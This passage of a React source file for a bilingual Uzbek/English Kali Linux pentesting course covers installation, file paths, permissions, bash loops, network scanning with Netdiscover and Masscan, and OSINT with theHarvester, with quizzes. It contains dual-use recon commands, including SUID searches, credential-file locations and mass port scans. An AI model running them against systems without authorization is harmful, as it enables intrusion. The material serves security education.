      q:{uz:"Burp Suite'ning qaysi qismi bitta so'rovni qo'lda o'zgartirib qayta-qayta yuborish uchun mo'ljallangan?",en:"Which part of Burp Suite is meant for manually modifying and resending a single request repeatedly?"},
      opts:[{uz:"Proxy",en:"Proxy"},{uz:"Repeater",en:"Repeater"},{uz:"Decoder",en:"Decoder"},{uz:"Comparer",en:"Comparer"}],
      correct:1,
      exp:{uz:"Repeater bitta so'rovni qo'lda o'zgartirib, qayta yuborish va javoblarni solishtirish uchun ishlatiladi.",en:"Repeater is used to manually tweak a single request, resend it and compare the responses."}
    })
  );
}


// ── L02: Installing Kali ──────────────────────────────────────
function LessonL02(){
  const lang=useLang();
  const ways=[
    {name:t(lang,"Virtual mashina (VM)","Virtual machine (VM)"),uz:"VirtualBox/VMware ichida. Eng xavfsiz va tavsiya etilgan usul — asosiy tizimingizga tegmaydi.",en:"Inside VirtualBox/VMware. The safest and recommended way — it never touches your host OS."},
    {name:t(lang,"Bare metal","Bare metal"),uz:"To'g'ridan-to'g'ri diskka o'rnatiladi. To'liq unumdorlik, lekin butun mashina Kali'ga bag'ishlanadi.",en:"Installed directly to disk. Full performance, but the whole machine is dedicated to Kali."},
    {name:t(lang,"Live USB","Live USB"),uz:"USB'dan o'rnatmasdan ishga tushiriladi. Iz qoldirmaydi, forensika uchun qulay.",en:"Boots from USB without installing. Leaves no trace, handy for forensics."},
    {name:"WSL",uz:"Windows ichida (WSL2). GUI'siz, lekin buyruq qatori vositalari uchun tez.",en:"Inside Windows (WSL2). No GUI, but fast for command-line tools."},
  ];
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"O'rnatish usullari","Installation methods")),
    React.createElement(P,null,t(lang,
      "Kali'ni o'rnatishning bir necha yo'li bor. Yangi boshlovchilar uchun virtual mashina eng yaxshi tanlov — xatolar asosiy tizimingizga zarar yetkazmaydi va snapshot'lar orqali istalgan holatga qaytish mumkin.",
      "There are several ways to install Kali. For beginners a virtual machine is the best choice — mistakes won't harm your host OS, and snapshots let you roll back to any state."
    )),
    ways.map((w,i)=>React.createElement("div",{key:i,style:{marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
      React.createElement("div",{style:{fontWeight:700,fontSize:13,color:"var(--accent)",marginBottom:3}},w.name),
      React.createElement("div",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.55}},t(lang,w.uz,w.en))
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Yuklab olish va tekshirish","Download and verify")),
    React.createElement(P,null,t(lang,
      "Har doim faqat rasmiy saytdan (kali.org/get-kali) yuklab oling va SHA256 summasini tekshiring. Bu — o'rnatuvchi buzilmaganiga yoki almashtirilmaganiga ishonch hosil qilishning yagona yo'li.",
      "Always download only from the official site (kali.org/get-kali) and verify the SHA256 sum. This is the only way to be sure the installer hasn't been corrupted or tampered with."
    )),
    React.createElement(Terminal,null,
      "# Yuklangan ISO ning SHA256 summasini hisoblash\nsha256sum kali-linux-2024.1-installer-amd64.iso\n\n# Natijani sayt'dagi rasmiy summa bilan solishtiring\n# Ular BIR XIL bo'lishi shart"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Birinchi qadamlar","First steps")),
    React.createElement(Terminal,null,
      "# O'rnatgandan keyin tizimni yangilang\nsudo apt update && sudo apt full-upgrade -y\n\n# Standart parolni o'zgartiring\npasswd\n\n# (VM'da) snapshot oling — toza holatga qaytish uchun"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Snapshot: ","Snapshot: ")),
      t(lang,"VM'da toza o'rnatishdan keyin darhol snapshot oling. Biror narsa buzilsa yoki test muhitini ifloslasangiz, bir soniyada toza holatga qaytasiz.",
        "Take a snapshot right after a clean install in a VM. If something breaks or you pollute your test environment, you can revert to a clean state in a second.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Yangi boshlovchi uchun Kali'ni o'rnatishning eng xavfsiz usuli qaysi?",en:"What is the safest way for a beginner to install Kali?"},
      opts:[{uz:"Asosiy diskka bare metal",en:"Bare metal on the main disk"},{uz:"Virtual mashina (VM)",en:"Virtual machine (VM)"},{uz:"Telefonga",en:"On a phone"},{uz:"Router'ga",en:"On a router"}],
      correct:1,
      exp:{uz:"Virtual mashina asosiy tizimni izolyatsiya qiladi va snapshot orqali xatolardan qaytish imkonini beradi — shuning uchun eng xavfsiz.",en:"A virtual machine isolates the host OS and lets you revert from mistakes via snapshots — hence the safest."}
    })
  );
}

// ── L04: Linux file system ────────────────────────────────────
function LessonL04(){
  const lang=useLang();
  const dirs=[
    {p:"/",uz:"Ildiz — butun fayl tizimining boshlanish nuqtasi.",en:"Root — the top of the entire file system."},
    {p:"/etc",uz:"Tizim sozlama fayllari (parollar, xizmatlar, tarmoq).",en:"System configuration files (passwords, services, network)."},
    {p:"/home",uz:"Oddiy foydalanuvchilarning shaxsiy kataloglari.",en:"Home directories of normal users."},
    {p:"/root",uz:"root foydalanuvchining shaxsiy katalogi.",en:"The root user's home directory."},
    {p:"/var",uz:"O'zgaruvchan ma'lumot — loglar (/var/log), veb (/var/www).",en:"Variable data — logs (/var/log), web (/var/www)."},
    {p:"/tmp",uz:"Vaqtinchalik fayllar. Ko'pincha hammaga yozish ruxsati bor.",en:"Temporary files. Often world-writable."},
    {p:"/usr",uz:"Foydalanuvchi dasturlari va vositalar.",en:"User programs and tools."},
    {p:"/bin, /sbin",uz:"Muhim tizim buyruqlari (bajariladigan fayllar).",en:"Essential system commands (executables)."},
  ];
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"FHS — fayl tizimi ierarxiyasi","FHS — the file system hierarchy")),
    React.createElement(P,null,t(lang,
      "Windows'dan farqli o'laroq, Linux'da C: yoki D: disklari yo'q. Hamma narsa yagona ildizdan (/) boshlanadi va daraxt shaklida tarmoqlanadi. Bu tuzilma FHS (Filesystem Hierarchy Standard) deb ataladi.",
      "Unlike Windows, Linux has no C: or D: drives. Everything starts from a single root (/) and branches out as a tree. This structure is called the FHS (Filesystem Hierarchy Standard)."
    )),
    dirs.map((d,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start"}},
      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:12,fontWeight:700,color:"var(--accent)",minWidth:80}},d.p),
      React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.55}},t(lang,d.uz,d.en))
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Pentest uchun muhim yo'llar","Paths that matter in a pentest")),
    React.createElement(Terminal,null,
      "/etc/passwd     # foydalanuvchilar ro'yxati (hamma o'qiy oladi)\n/etc/shadow     # parol hashlari (faqat root)\n/var/www/html   # veb-sayt fayllari\n/var/log/auth.log  # kirish urinishlari jurnali\n~/.ssh/         # SSH kalitlari\n/usr/share/wordlists/  # Kali lug'atlari (rockyou.txt)"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Yashirin fayllar: ","Hidden files: ")),
      t(lang,"Nomi nuqta (.) bilan boshlanadigan fayllar yashiringan hisoblanadi (masalan .bashrc, .ssh). Ularni ko'rish uchun ls -a ishlating — ular ko'pincha maxfiy ma'lumot saqlaydi.",
        "Files whose names start with a dot (.) are hidden (e.g. .bashrc, .ssh). Use ls -a to see them — they often hold sensitive data.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Parol hashlari qaysi faylda saqlanadi va uni kim o'qiy oladi?",en:"Which file stores password hashes and who can read it?"},
      opts:[{uz:"/etc/passwd — hamma",en:"/etc/passwd — everyone"},{uz:"/etc/shadow — faqat root",en:"/etc/shadow — only root"},{uz:"/var/log — hamma",en:"/var/log — everyone"},{uz:"/home — mehmonlar",en:"/home — guests"}],
      correct:1,
      exp:{uz:"/etc/shadow parol hashlarini saqlaydi va faqat root o'qiy oladi; /etc/passwd esa foydalanuvchilar ro'yxatini saqlaydi va hamma o'qiy oladi.",en:"/etc/shadow stores password hashes and is readable only by root; /etc/passwd holds the user list and is world-readable."}
    })
  );
}

// ── L05: Users & permissions ──────────────────────────────────
function LessonL05(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Foydalanuvchilar va guruhlar","Users and groups")),
    React.createElement(P,null,t(lang,
      "Linux — ko'p foydalanuvchili tizim. Har bir foydalanuvchining UID'si (identifikatori) va bir yoki bir necha guruhi bor. root (UID 0) — cheklovsiz superfoydalanuvchi. Pentestda maqsad ko'pincha oddiy foydalanuvchidan root'ga o'tish (privilege escalation).",
      "Linux is a multi-user system. Each user has a UID (identifier) and one or more groups. root (UID 0) is the unrestricted superuser. In a pentest the goal is often to move from a normal user to root (privilege escalation)."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Ruxsatlarni o'qish (rwx)","Reading permissions (rwx)")),
    React.createElement(P,null,t(lang,
      "ls -l har bir fayl uchun 10 belgili ruxsat qatorini ko'rsatadi. Masalan -rwxr-xr-- : birinchi belgi tur (- fayl, d katalog), keyin egasi (rwx), guruhi (r-x) va boshqalar (r--) uchun ruxsatlar. r=o'qish, w=yozish, x=bajarish.",
      "ls -l shows a 10-character permission string for each file. For example -rwxr-xr-- : the first char is the type (- file, d directory), then permissions for owner (rwx), group (r-x) and others (r--). r=read, w=write, x=execute."
    )),
    React.createElement(Terminal,null,
      "# Ruxsatlarni o'zgartirish (raqamli usul)\nchmod 755 script.sh   # rwxr-xr-x\nchmod 600 id_rsa      # rw------- (faqat egasi)\nchmod +x exploit.sh   # bajarish huquqini qo'shish\n\n# Egasini o'zgartirish\nchown user:group file.txt"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"sudo va SUID","sudo and SUID")),
    React.createElement(P,null,t(lang,
      "sudo oddiy foydalanuvchiga vaqtincha root huquqlari bilan buyruq bajarishga ruxsat beradi. SUID biti o'rnatilgan fayllar esa egasining (ko'pincha root'ning) huquqlari bilan ishga tushadi — bu privilege escalation uchun tez-tez ishlatiladigan yo'l.",
      "sudo lets a normal user run a command temporarily with root rights. Files with the SUID bit set run with the owner's rights (often root's) — a common path for privilege escalation."
    )),
    React.createElement(Terminal,null,
      "# Menga qaysi sudo huquqlari berilgan?\nsudo -l\n\n# SUID o'rnatilgan fayllarni topish (privesc tekshiruvi)\nfind / -perm -4000 -type f 2>/dev/null"
    ),
    React.createElement(Quiz,{
      q:{uz:"chmod 600 id_rsa buyrug'i faylga qanday ruxsat beradi?",en:"What permissions does chmod 600 id_rsa set on the file?"},
      opts:[{uz:"Hamma o'qiy va yoza oladi",en:"Everyone can read and write"},{uz:"Faqat egasi o'qiy va yoza oladi",en:"Only the owner can read and write"},{uz:"Hamma bajara oladi",en:"Everyone can execute"},{uz:"Hech kim kira olmaydi",en:"No one can access it"}],
      correct:1,
      exp:{uz:"600 = rw------- : faqat egasiga o'qish va yozish, guruh va boshqalarga hech qanday huquq yo'q. SSH kalitlari uchun aynan shu talab qilinadi.",en:"600 = rw------- : read and write for the owner only, nothing for group or others. This is exactly what SSH keys require."}
    })
  );
}

// ── L07: Bash scripting ───────────────────────────────────────
function LessonL07(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Nega bash skript?","Why bash scripting?")),
    React.createElement(P,null,t(lang,
      "Bash skript — bir nechta buyruqni bitta faylga jamlab, avtomatik bajarish usuli. Pentestda takrorlanuvchi vazifalarni (skanerlash, IP diapazonini tekshirish, natijalarni saralash) avtomatlashtiradi va vaqtni tejaydi.",
      "A bash script bundles several commands into one file and runs them automatically. In a pentest it automates repetitive tasks (scanning, checking an IP range, sorting results) and saves time."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy tuzilma","Basic structure")),
    React.createElement(Terminal,null,
      "#!/bin/bash\n# ^ shebang — bu skript bash bilan ishga tushishini bildiradi\n\nTARGET=\"10.0.0.5\"          # o'zgaruvchi\necho \"Skanerlanmoqda: $TARGET\"\n\n# Shart (if)\nif ping -c1 $TARGET &>/dev/null; then\n  echo \"Xost tirik\"\nelse\n  echo \"Xost o'chiq\"\nfi"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Sikllar (loops)","Loops")),
    React.createElement(Terminal,null,
      "#!/bin/bash\n# Butun /24 tarmoqni ping bilan tekshirish\nfor i in $(seq 1 254); do\n  ip=\"10.0.0.$i\"\n  ping -c1 -W1 $ip &>/dev/null && echo \"$ip tirik\"\ndone"
    ),
    React.createElement(P,null,t(lang,
      "Skriptni bajarish uchun avval unga bajarish huquqini bering: chmod +x scan.sh, keyin ./scan.sh bilan ishga tushiring.",
      "To run a script, first give it execute permission: chmod +x scan.sh, then launch it with ./scan.sh."
    )),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"$() — buyruq almashtirish: ","$() — command substitution: ")),
      t(lang,"$(buyruq) buyruqning chiqishini o'zgaruvchiga oladi. Masalan HOSTS=$(cat targets.txt) — fayl mazmunini o'zgaruvchiga yuklaydi.",
        "$(command) captures a command's output into a variable. For example HOSTS=$(cat targets.txt) loads a file's contents into a variable.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Skriptning birinchi qatoridagi #!/bin/bash nima deyiladi va nima vazifasi bor?",en:"What is #!/bin/bash on the first line of a script called, and what is its job?"},
      opts:[{uz:"Izoh — hech narsa qilmaydi",en:"A comment — it does nothing"},{uz:"Shebang — skriptni qaysi interpretator ishga tushirishini bildiradi",en:"Shebang — it tells which interpreter runs the script"},{uz:"O'zgaruvchi e'loni",en:"A variable declaration"},{uz:"Sikl boshlanishi",en:"The start of a loop"}],
      correct:1,
      exp:{uz:"Shebang (#!) qatori tizimga skriptni qaysi dastur (bu yerda /bin/bash) bilan bajarishni ko'rsatadi.",en:"The shebang (#!) line tells the system which program (here /bin/bash) to execute the script with."}
    })
  );
}

// ── L08: Networking basics ────────────────────────────────────
function LessonL08(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Tarmoq holatini ko'rish","Inspecting the network")),
    React.createElement(P,null,t(lang,
      "Har qanday tarmoq hujumidan oldin o'z mashinangizning tarmoq holatini bilishingiz kerak: IP manzilingiz, tarmoq interfeyslari va marshrutlar. Kali'da bu uchun zamonaviy ip buyrug'idan foydalaniladi.",
      "Before any network attack you must know your own machine's network state: your IP address, network interfaces and routes. In Kali this is done with the modern ip command."
    )),
    React.createElement(Terminal,null,
      "# IP manzil va interfeyslar\nip a\n\n# Marshrutlash jadvali (default gateway)\nip route\n\n# Eski uslub (hali ham ishlaydi)\nifconfig\nroute -n"
    ),
    React.createElement(H2,{num:"§2"},t(lang,"Ulanishlarni tekshirish","Checking connectivity")),
    React.createElement(Terminal,null,
      "# Xost tirikligini tekshirish\nping -c4 10.0.0.1\n\n# Ochiq portlar va faol ulanishlar (zamonaviy)\nss -tulnp\n\n# DNS so'rovi\nnslookup example.com"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Interfeysni boshqarish","Managing an interface")),
    React.createElement(Terminal,null,
      "# Interfeysni o'chirish/yoqish\nsudo ip link set eth0 down\nsudo ip link set eth0 up\n\n# MAC manzilni vaqtincha o'zgartirish (anonimlik uchun)\nsudo ip link set eth0 down\nsudo macchanger -r eth0\nsudo ip link set eth0 up"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"ss vs netstat: ","ss vs netstat: ")),
      t(lang,"ss — netstat'ning zamonaviy va tezroq o'rnini bosuvchisi. ss -tulnp barcha tinglayotgan (listening) TCP/UDP portlar va ularga tegishli jarayonlarni ko'rsatadi.",
        "ss is the modern, faster replacement for netstat. ss -tulnp shows all listening TCP/UDP ports and their owning processes.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Kali'da IP manzil va tarmoq interfeyslarini ko'rish uchun qaysi zamonaviy buyruq ishlatiladi?",en:"Which modern command shows the IP address and network interfaces in Kali?"},
      opts:[{uz:"ip a",en:"ip a"},{uz:"ls -l",en:"ls -l"},{uz:"cat /ip",en:"cat /ip"},{uz:"ping",en:"ping"}],
      correct:0,
      exp:{uz:"ip a (ip address) interfeyslar va ularning IP manzillarini ko'rsatadi; u eski ifconfig'ning zamonaviy o'rnini bosadi.",en:"ip a (ip address) lists interfaces and their IP addresses; it is the modern replacement for the old ifconfig."}
    })
  );
}

// ── L09: Services ─────────────────────────────────────────────
function LessonL09(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Xizmatlar va systemctl","Services and systemctl")),
    React.createElement(P,null,t(lang,
      "Xizmat (service) — fonda doimiy ishlab turadigan dastur, masalan veb-server yoki SSH. Kali systemd'dan foydalanadi va xizmatlar systemctl buyrug'i orqali boshqariladi.",
      "A service is a program that runs continuously in the background, such as a web server or SSH. Kali uses systemd, and services are managed with the systemctl command."
    )),
    React.createElement(Terminal,null,
      "# Xizmatni ishga tushirish / to'xtatish\nsudo systemctl start ssh\nsudo systemctl stop ssh\n\n# Holatini ko'rish\nsudo systemctl status ssh\n\n# Tizim yuklanishida avtomatik ishga tushirish\nsudo systemctl enable ssh\nsudo systemctl disable ssh"
    ),
    React.createElement(H2,{num:"§2"},t(lang,"Pentestda kerak bo'ladigan xizmatlar","Services you'll need in a pentest")),
    React.createElement(Terminal,null,
      "# Metasploit uchun ma'lumotlar bazasi\nsudo systemctl start postgresql\n\n# Fayl uzatish uchun vaqtinchalik veb-server\nsudo systemctl start apache2\n# yoki tez usul:\npython3 -m http.server 8000\n\n# Masofaviy kirish uchun SSH\nsudo systemctl start ssh"
    ),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"Xizmatlarni faqat kerak bo'lganda ishga tushiring. Doimiy ishlab turgan SSH yoki veb-server sizning mashinangizni ham hujum nishoniga aylantiradi.",
        "Only start services when you need them. An always-running SSH or web server turns your own machine into an attack target too.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Xizmatni tizim har yuklanganda avtomatik ishga tushishini ta'minlash uchun qaysi buyruq ishlatiladi?",en:"Which command makes a service start automatically every time the system boots?"},
      opts:[{uz:"systemctl start",en:"systemctl start"},{uz:"systemctl enable",en:"systemctl enable"},{uz:"systemctl status",en:"systemctl status"},{uz:"systemctl stop",en:"systemctl stop"}],
      correct:1,
      exp:{uz:"systemctl enable xizmatni yuklanish vaqtida avtomatik ishga tushirishga sozlaydi; start esa uni faqat hozir bir marta ishga tushiradi.",en:"systemctl enable sets a service to start automatically at boot; start only launches it once right now."}
    })
  );
}

// ── L10: Kali tools overview ──────────────────────────────────
function LessonL10(){
  const lang=useLang();
  const cats=[
    {n:t(lang,"Ma'lumot to'plash","Information Gathering"),tools:"Nmap, theHarvester, dnsenum, Maltego"},
    {n:t(lang,"Zaiflik tahlili","Vulnerability Analysis"),tools:"Nikto, OpenVAS, Nmap NSE"},
    {n:t(lang,"Veb ilovalar","Web Applications"),tools:"Burp Suite, OWASP ZAP, sqlmap, wpscan"},
    {n:t(lang,"Parol hujumlari","Password Attacks"),tools:"Hydra, John, Hashcat, Medusa"},
    {n:t(lang,"Simsiz hujumlar","Wireless Attacks"),tools:"Aircrack-ng, Wifite, Kismet"},
    {n:t(lang,"Ekspluatatsiya","Exploitation"),tools:"Metasploit, searchsploit, SET"},
    {n:t(lang,"Sniffing & Spoofing","Sniffing & Spoofing"),tools:"Wireshark, Ettercap, Bettercap"},
    {n:t(lang,"Post-ekspluatatsiya","Post Exploitation"),tools:"Meterpreter, Mimikatz, PowerSploit"},
  ];
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"600+ vosita, tartibli","600+ tools, organized")),
    React.createElement(P,null,t(lang,
      "Kali'ning kuchi — 600 dan ortiq oldindan o'rnatilgan xavfsizlik vositasida. Ular pentest bosqichlariga mos ravishda toifalarga ajratilgan. Ilovalar menyusi ham xuddi shu toifalar bo'yicha tuzilgan.",
      "Kali's power lies in its 600+ pre-installed security tools. They are grouped into categories that mirror the phases of a pentest. The applications menu is organized by these same categories."
    )),
    cats.map((c,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start",flexWrap:"wrap"}},
      React.createElement("span",{style:{fontSize:13,fontWeight:700,color:"var(--accent)",minWidth:150}},c.n),
      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:11.5,color:"var(--text-2)"}},c.tools)
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Vositani topish","Finding a tool")),
    React.createElement(Terminal,null,
      "# Vosita o'rnatilganmi?\nwhich nmap\n\n# Vosita haqida qo'llanma\nman nmap\n\n# Ko'pchilik vositada yordam\nnmap --help\n\n# O'rnatilmagan bo'lsa\nsudo apt install <tool>"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Metapaketlar: ","Metapackages: ")),
      t(lang,"Kali barcha vositani o'rnatishni talab qilmaydi. kali-linux-large yoki maxsus kali-tools-web kabi metapaketlar orqali kerakli toifani birdan o'rnatishingiz mumkin.",
        "Kali doesn't force you to install every tool. Metapackages like kali-linux-large or the focused kali-tools-web let you install a whole category at once.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Kali vositalari qanday tartibga solingan?",en:"How are Kali's tools organized?"},
      opts:[{uz:"Alifbo tartibida",en:"Alphabetically"},{uz:"Pentest bosqichlariga mos toifalar bo'yicha",en:"Into categories matching pentest phases"},{uz:"Fayl hajmi bo'yicha",en:"By file size"},{uz:"Tasodifiy",en:"Randomly"}],
      correct:1,
      exp:{uz:"Vositalar ma'lumot to'plash, ekspluatatsiya, parol hujumlari kabi pentest bosqichlariga mos toifalarga ajratilgan — bu kerakli vositani tez topishga yordam beradi.",en:"Tools are grouped into categories matching pentest phases such as information gathering, exploitation and password attacks — helping you find the right tool fast."}
    })
  );
}


// ── L12: Netdiscover ──────────────────────────────────────────
function LessonL12(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Netdiscover nima?","What is Netdiscover?")),
    React.createElement(P,null,t(lang,
      "Netdiscover — ARP so'rovlari yordamida lokal tarmoqdagi tirik xostlarni topadigan vosita. U ping'ga tayanmaydi, shuning uchun ICMP'ni bloklaydigan xostlarni ham aniqlaydi. Tarmoq xaritasini tuzishning eng birinchi qadami.",
      "Netdiscover finds live hosts on the local network using ARP requests. It doesn't rely on ping, so it detects even hosts that block ICMP. It's the very first step in mapping a network."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
    React.createElement(Terminal,null,
      "# Aniq diapazonni skanerlash (tez, aktiv)\nsudo netdiscover -r 10.0.0.0/24\n\n# Muayyan interfeys bo'yicha\nsudo netdiscover -i eth0\n\n# Passiv rejim — faqat tinglaydi, so'rov yubormaydi (yashirin)\nsudo netdiscover -p"
    ),
    React.createElement(P,null,t(lang,
      "Natijada har bir tirik xostning IP manzili, MAC manzili va tarmoq kartasi ishlab chiqaruvchisi (vendor) ko'rsatiladi. MAC vendor ko'pincha qurilma turini (masalan router, printer, VM) ochib beradi.",
      "The output shows each live host's IP address, MAC address and network card vendor. The MAC vendor often reveals the device type (e.g. router, printer, VM)."
    )),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Passiv vs aktiv: ","Passive vs active: ")),
      t(lang,"Passiv rejim (-p) hech qanday paket yubormay, faqat tarmoqdagi ARP trafigini tinglaydi — bu deyarli aniqlanmaydi, lekin sekinroq. Aktiv rejim tezroq, lekin tarmoqqa iz qoldiradi.",
        "Passive mode (-p) sends no packets and just listens to ARP traffic on the network — nearly undetectable but slower. Active mode is faster but leaves a trace on the network.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Netdiscover qanday protokol yordamida tirik xostlarni topadi?",en:"Which protocol does Netdiscover use to find live hosts?"},
      opts:[{uz:"ICMP (ping)",en:"ICMP (ping)"},{uz:"ARP",en:"ARP"},{uz:"DNS",en:"DNS"},{uz:"HTTP",en:"HTTP"}],
      correct:1,
      exp:{uz:"Netdiscover ARP so'rovlaridan foydalanadi, shuning uchun u ping'ni (ICMP) bloklaydigan xostlarni ham aniqlaydi.",en:"Netdiscover uses ARP requests, so it detects hosts even if they block ping (ICMP)."}
    })
  );
}

// ── L13: Masscan ──────────────────────────────────────────────
function LessonL13(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Masscan nima?","What is Masscan?")),
    React.createElement(P,null,t(lang,
      "Masscan — dunyodagi eng tezkor port skaneri. U o'zining TCP/IP stekidan foydalanib, teoretik jihatdan butun internetni bir necha daqiqada skanerlay oladi. Nmap'dan yuzlab marta tez, lekin kamroq batafsil.",
      "Masscan is the fastest port scanner in the world. Using its own TCP/IP stack, it can theoretically scan the entire internet in minutes. It's hundreds of times faster than Nmap, but less detailed."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
    React.createElement(Terminal,null,
      "# Bitta portni katta diapazonda skanerlash\nsudo masscan 10.0.0.0/16 -p80\n\n# Bir necha port, tezlikni cheklab\nsudo masscan 10.0.0.0/24 -p22,80,443 --rate=1000\n\n# Barcha portlar\nsudo masscan 10.0.0.5 -p0-65535 --rate=10000"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Masscan + Nmap ish oqimi","The Masscan + Nmap workflow")),
    React.createElement(P,null,t(lang,
      "Amaliyotda ikkovi birga ishlatiladi: Masscan katta diapazonda ochiq portlarni tez topadi, keyin Nmap topilgan portlarni chuqur (versiya, xizmat) tekshiradi. Bu tezlik va batafsillikni birlashtiradi.",
      "In practice the two are used together: Masscan quickly finds open ports across a large range, then Nmap deeply inspects the found ports (version, service). This combines speed and detail."
    )),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"--rate ni ehtiyotkorlik bilan sozlang. Juda yuqori tezlik tarmoqni to'ldirib, xizmatlarni ishdan chiqarishi (DoS) va sizni darhol aniqlashi mumkin. Faqat ruxsat berilgan tarmoqlarda ishlating.",
        "Set --rate carefully. A very high rate can flood the network, knock out services (DoS) and get you detected instantly. Only use it on authorized networks.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Masscan va Nmap odatda qanday birga ishlatiladi?",en:"How are Masscan and Nmap typically used together?"},
      opts:[{uz:"Masscan tez topadi, Nmap chuqur tekshiradi",en:"Masscan finds fast, Nmap inspects deeply"},{uz:"Ikkalasi bir xil ishni qiladi",en:"They do the exact same job"},{uz:"Nmap avval, Masscan keyin bekor qiladi",en:"Nmap first, Masscan cancels it"},{uz:"Ular birga ishlamaydi",en:"They cannot work together"}],
      correct:0,
      exp:{uz:"Masscan katta diapazonda ochiq portlarni tez aniqlaydi, so'ng Nmap o'sha portlarni versiya va xizmat aniqlash uchun batafsil skanerlaydi.",en:"Masscan rapidly finds open ports over a large range, then Nmap scans those ports in detail for version and service detection."}
    })
  );
}

// ── L15: theHarvester ─────────────────────────────────────────
function LessonL15(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"theHarvester nima?","What is theHarvester?")),
    React.createElement(P,null,t(lang,
      "theHarvester — ochiq manba razvedkasi (OSINT) vositasi. U ochiq manbalardan (qidiruv tizimlari, PGP serverlari, Shodan) nishon tashkilotning email manzillari, subdomenlari, xodim ismlari va IP'larini to'playdi — nishonga hech qanday paket yubormasdan.",
      "theHarvester is an open-source intelligence (OSINT) tool. It gathers a target organization's email addresses, subdomains, employee names and IPs from public sources (search engines, PGP servers, Shodan) — without sending any packets to the target."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
    React.createElement(Terminal,null,
      "# Google orqali email va subdomenlar\ntheHarvester -d example.com -b google\n\n# Bir necha manba birdan\ntheHarvester -d example.com -b bing,duckduckgo,crtsh\n\n# Natijani HTML/XML'ga saqlash\ntheHarvester -d example.com -b all -f natija"
    ),
    React.createElement(P,null,t(lang,
      "Bu passiv razvedka — nishon buni bilmaydi, chunki barcha ma'lumot uchinchi tomon manbalaridan olinadi. Topilgan email manzillar keyingi phishing yoki parol hujumlari uchun ro'yxat bo'lib xizmat qiladi.",
      "This is passive reconnaissance — the target never knows, since all data comes from third-party sources. The discovered email addresses serve as a list for later phishing or password attacks."
    )),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"crt.sh manbasi: ","The crt.sh source: ")),
      t(lang,"crtsh manbasi SSL sertifikat shaffoflik jurnallaridan subdomenlarni topadi — bu ko'pincha yashirin ichki subdomenlarni ham ochib beradi.",
        "The crtsh source finds subdomains from SSL certificate transparency logs — this often reveals hidden internal subdomains too.")
    ),
    React.createElement(Quiz,{
      q:{uz:"theHarvester qanday razvedka turiga misol?",en:"What type of reconnaissance is theHarvester an example of?"},
      opts:[{uz:"Aktiv (nishonga to'g'ridan hujum)",en:"Active (directly probing the target)"},{uz:"Passiv (ochiq manba OSINT)",en:"Passive (open-source OSINT)"},{uz:"Ekspluatatsiya",en:"Exploitation"},{uz:"Post-ekspluatatsiya",en:"Post-exploitation"}],
      correct:1,
      exp:{uz:"theHarvester passiv OSINT vositasi — u ma'lumotni uchinchi tomon ochiq manbalaridan oladi va nishonga hech narsa yubormaydi.",en:"theHarvester is a passive OSINT tool — it pulls data from third-party public sources and sends nothing to the target."}
    })
  );
}

// ── L17: WhatWeb ──────────────────────────────────────────────
function LessonL17(){
  const lang=useLang();
